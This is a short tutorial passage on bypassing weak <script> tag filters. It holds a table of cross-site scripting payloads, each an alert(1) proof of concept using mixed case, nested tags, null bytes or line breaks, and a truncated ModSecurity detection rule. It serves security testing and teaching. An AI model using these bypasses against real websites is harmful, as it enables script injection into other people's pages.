The `<script>` tag is the primary method to execute JavaScript.

Some filters do not cover all possible cases, making them weak and prone to bypass techniques. The following is an example of few bypasses for weak `<script>` tag filter rules:

| Bypass Payload                               | Description                                                    |
| -------------------------------------------- | -------------------------------------------------------------- |
| `<ScRiPt>alert(1);</ScRiPt>`                 | Mixed of upper and lower-case characters.                      |
| `<ScRiPt>alert(1);`                          | Mixed of upper and lower-case characters, without closing tag. |
| `<script/random>alert(1);</script>`          | Random string after the tag name.                              |
| `<script`<br>`>alert(1);</script>`           | New line after the tag name.                                   |
| `<scr<script>ipt>alert(1);</scr<script>ipt>` | Nested tags.                                                   |
| `<scr\x00ipt>alert(1);</script>`             | NULL bytes.                                                    |
## ModSecurity Filter Rules
The following is an example of how ModSecurity filters the `<script>` tag:
```txt
SecRule ARGS
"(?i)(<script[^>]*>[\s\S]*?<\/script[^>]*>|<script[^>]
*>[\s\S]*?<\/script[[\s\S]]*[\s\S]|<script[^>]*>[\s\S]
*?<\/script[\s]*[\s]|<script[^>]*>[\s\S]*?<\/script|<s
cript[^>]*>[\s\S]*?)"
...[SNIP]...
```
